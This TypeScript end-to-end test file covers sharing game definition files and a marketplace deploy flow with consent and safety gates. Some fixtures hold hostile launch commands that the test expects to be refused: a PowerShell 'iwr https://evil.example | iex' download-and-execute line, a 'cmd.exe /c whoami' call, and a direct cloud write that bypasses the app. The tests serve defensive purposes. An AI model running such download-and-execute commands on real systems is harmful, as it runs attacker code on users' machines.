/**
 * Game definitions as shareable content (PR-E): the definition-file round
 * trip (export → preview import → confirm import) and the marketplace path
 * for realms that bring their own game definition — consent on the first
 * deploy, rejection of definitions that fail the safety gate, including one
 * written straight into the cloud without going through the app.
 */

import { expect } from "../client";
import { ADMIN_USER, FAKE_SUPABASE_URL, FAKE_SUPABASE_ANON_KEY } from "../config";
import { scenario, step, type ScenarioContext } from "./framework";

const goodSpec = (port: number) => ({
  params: [],
  configFiles: [],
  ports: [{ protocol: "UDP", port: "{port}" }],
  defaultPort: port,
  install: { appId: "896660", installSubDir: "e2e-shared", checkFile: "server.exe", requiredDiskGB: 1 },
  launch: { executable: "server.exe", args: ["-port", "{port}"] },
});

export const definitionSharingScenarios = [
  scenario(
    "definitions/file-share",
    "definition file export → preview import → confirm import; unsafe files and exports refused",
    ["smoke"],
    async (ctx: ScenarioContext) => {
      const { admin } = ctx;
      let definitionId = "";
      let importedId = "";
      let scriptId = "";

      await step("create a data-only custom definition and export it as a file", async () => {
        const unauth = await fetch(`${admin.baseUrl}/api/definitions/${"00000000-0000-0000-0000-000000000000"}/export`);
        expect(unauth.status === 401, `unauth export → ${unauth.status}, want 401`);

        const created = await admin.post("/api/definitions", {
          displayName: "E2E Shared Game",
          installMethod: "STEAMCMD",
          spec: goodSpec(25591),
          description: "harness fixture",
        });
        expect(created.status === 201, `POST definition → ${created.status}: ${created.text.slice(0, 300)}`);
        definitionId = created.body?.id;

        const exported = await admin.get(`/api/definitions/${definitionId}/export`);
        expect(exported.status === 200, `export → ${exported.status}: ${exported.text.slice(0, 200)}`);
        expect(exported.body?.format === "realmswap-game-definition", "export is a definition file");
        expect((exported.headers.get("content-disposition") || "").includes(".realmswap-game.json"), "attachment filename ends in .realmswap-game.json");
        expect(exported.body?.definition?.spec?.install?.appId === "896660", "spec round-trips");
        ctx.state.definitionFile = exported.body;
        ctx.state.definitionId = definitionId;
      });

      await step("import: preview says what runs and writes nothing; confirm creates", async () => {
        const file = ctx.state.definitionFile;
        const preview = await admin.post("/api/definitions/import", { file });
        expect(preview.status === 200, `import preview → ${preview.status}: ${preview.text.slice(0, 200)}`);
        expect(preview.body?.preview?.definition?.source === "Steam app 896660", "preview names the Steam app as the source");
        expect(preview.body?.preview?.definition?.executable === "server.exe", "preview names the program that runs");

        const confirmed = await admin.post("/api/definitions/import", { file, confirm: true });
        expect(confirmed.status === 201, `import confirm → ${confirmed.status}: ${confirmed.text.slice(0, 200)}`);
        importedId = confirmed.body?.id;
        expect(confirmed.body?.slug === "e2e-shared-game-2", `slug uniquified → ${confirmed.body?.slug}`);
        const list = await admin.get("/api/definitions");
        const copies = (list.body?.definitions ?? []).filter((d: any) => d.slug.startsWith("e2e-shared-game"));
        expect(copies.length === 2, `both copies exist → ${copies.map((d: any) => d.slug).join(", ")}`);
      });

      await step("imports that would run something else are refused", async () => {
        const file = ctx.state.definitionFile;
        const hostile = JSON.parse(JSON.stringify(file));
        hostile.definition.spec.launch = { executable: "powershell.exe", executableOnPath: true, args: ["-Command", "x"] };
        const res = await admin.post("/api/definitions/import", { file: hostile, confirm: true });
        expect(res.status === 400 && res.text.includes("PATH"), `PATH program refused → ${res.status}: ${res.text.slice(0, 200)}`);

        const wrongFormat = { format: "not-a-realmswap-file", version: 1, definition: {} };
        const wrong = await admin.post("/api/definitions/import", { file: wrongFormat, confirm: true });
        expect(wrong.status === 400, `wrong format refused → ${wrong.status}`);
      });

      await step("script-based definitions cannot be exported", async () => {
        const scripted = await admin.post("/api/definitions", {
          displayName: "E2E Script Game", installMethod: "CUSTOM_SCRIPT",
          spec: { install: { installScript: "echo hi" }, launch: { launchScript: "echo run" }, params: [], configFiles: [], ports: [], defaultPort: 25592 },
        });
        expect(scripted.status === 201, `admin CUSTOM_SCRIPT create → ${scripted.status}`);
        scriptId = scripted.body?.id;
        const exported = await admin.get(`/api/definitions/${scriptId}/export`);
        expect(exported.status === 400 && exported.text.includes("can't be shared"), `script export refused → ${exported.status}`);
      });

      await step("cleanup: both shared copies and the script fixture are deleted", async () => {
        for (const id of [definitionId, importedId, scriptId]) {
          const del = await admin.delete(`/api/definitions/${id}`);
          expect(del.status === 200 || del.status === 204, `DELETE definition → ${del.status}`);
        }
      });
    }
  ),

  scenario(
    "marketplace/custom-definitions",
    "realms that bring their own game definition: publish gate, deploy consent, and the direct-cloud-write bypass",
    ["smoke"],
    async (ctx: ScenarioContext) => {
      const { admin, fakeSupabase } = ctx;

      let realmId = "";
      await step("publish refuses a definition that runs a PATH program", async () => {
        const hostile = {
          name: "E2E Shared Game",
          install: goodSpec(25593).install,
          launch: { executable: "cmd.exe", executableOnPath: true, args: ["/c", "whoami"] },
          defaultPort: 25593,
          params: [],
          configFiles: [],
          ports: [],
        };
        const res = await admin.post("/api/marketplace/publish", {
          name: "E2E Custom Game Realm",
          description: "brings its own game",
          gameSlug: "E2E_SHARED_GAME",
          payload: {},
          customDefSpec: hostile,
        });
        expect(res.status === 400 && res.text.includes("can't be shared"), `PATH-program publish refused → ${res.status}: ${res.text.slice(0, 200)}`);
      });

      await step("publish accepts a data-only definition; first deploy stops for consent", async () => {
        const published = await admin.post("/api/marketplace/publish", {
          name: "E2E Custom Game Realm",
          description: "brings its own game",
          gameSlug: "E2E_SHARED_GAME",
          tags: ["e2e"],
          payload: {},
          customDefSpec: { name: "E2E Shared Game", ...goodSpec(25593) },
        });
        expect(published.status === 200, `publish → ${published.status}: ${published.text.slice(0, 300)}`);
        realmId = published.body?.id;

        const before = await admin.get("/api/servers");
        const noConsent = await admin.post("/api/marketplace/deploy", { templateId: realmId });
        expect(noConsent.status === 409, `deploy without consent → ${noConsent.status}, want 409`);
        expect(noConsent.body?.code === "CUSTOM_DEFINITION_CONSENT", "409 carries the consent code");
        expect(noConsent.body?.definition?.source === "Steam app 896660", "consent names the source");
        expect(noConsent.body?.definition?.executable === "server.exe", "consent names the program");

        const after = await admin.get("/api/servers");
        expect(
          (after.body?.servers ?? []).length === (before.body?.servers ?? []).length,
          "nothing was created while awaiting consent"
        );
      });

      await step("deploying with consent installs the definition and creates the server", async () => {
        const res = await admin.post("/api/marketplace/deploy", { templateId: realmId, acceptCustomDefinition: true });
        expect(res.status === 200, `deploy with consent → ${res.status}: ${res.text.slice(0, 300)}`);
        expect(!!res.body?.serverId, "deploy returns the server id");
        ctx.state.definitionRealmServerId = res.body?.serverId;

        const defs = await admin.get("/api/definitions");
        const def = (defs.body?.definitions ?? []).find((d: any) => d.slug === "E2E_SHARED_GAME");
        expect(!!def && !def.isBuiltIn && def.installMethod === "STEAMCMD", `definition installed locally → ${def?.installMethod}`);

        const again = await admin.post("/api/marketplace/deploy", { templateId: realmId });
        expect(again.status === 200, `redeploy needs no consent once the definition exists → ${again.status}`);
      });

      await step("a hostile definition written straight to the cloud is refused at deploy", async () => {
        // An app account can write realm rows through the API without the app
        // route vetting them — exactly the path the database guard and the
        // deploy-side gate exist for.
        const session = fakeSupabase.sessionFor(fakeSupabase.signIn(ADMIN_USER.email, ADMIN_USER.password)!);
        const hostile = {
          name: "E2E Hostile Realm",
          description: "written straight to the cloud",
          game_slug: "E2E_HOSTILE_GAME",
          payload: {},
          custom_def_spec: {
            install: { appId: "896660", installSubDir: "x", checkFile: "x", requiredDiskGB: 1 },
            launch: { executable: "powershell.exe", executableOnPath: true, args: ["-Command", "iwr https://evil.example | iex"] },
            defaultPort: 25594,
            params: [],
            configFiles: [],
            ports: [],
          },
        };
        const direct = await fetch(`${FAKE_SUPABASE_URL}/rest/v1/realms?select=id`, {
          method: "POST",
          headers: {
            authorization: `Bearer ${session.access_token}`,
            apikey: FAKE_SUPABASE_ANON_KEY,
            "content-type": "application/json",
            prefer: "return=representation",
            accept: "application/vnd.pgrst.object+json",
          },
          body: JSON.stringify(hostile),
        });
        const directText = await direct.text();
        expect(direct.status === 201, `direct cloud write → ${direct.status}: ${directText.slice(0, 200)}`);
        const hostileRealmId = JSON.parse(directText)?.id;
        expect(!!hostileRealmId, "the hostile row exists in the cloud");

        const rejected = await admin.post("/api/marketplace/deploy", { templateId: hostileRealmId, acceptCustomDefinition: true });
        expect(rejected.status === 400, `hostile deploy → ${rejected.status}, want 400`);
        expect(rejected.body?.code === "CUSTOM_DEFINITION_REJECTED", `refusal code → ${rejected.body?.code}`);
        expect(JSON.stringify(rejected.body?.details).includes("PATH"), "refusal explains why");
        const defs = await admin.get("/api/definitions");
        expect(!(defs.body?.definitions ?? []).some((d: any) => d.slug === "E2E_HOSTILE_GAME"), "no local definition was created");
      });
    }
  ),
];
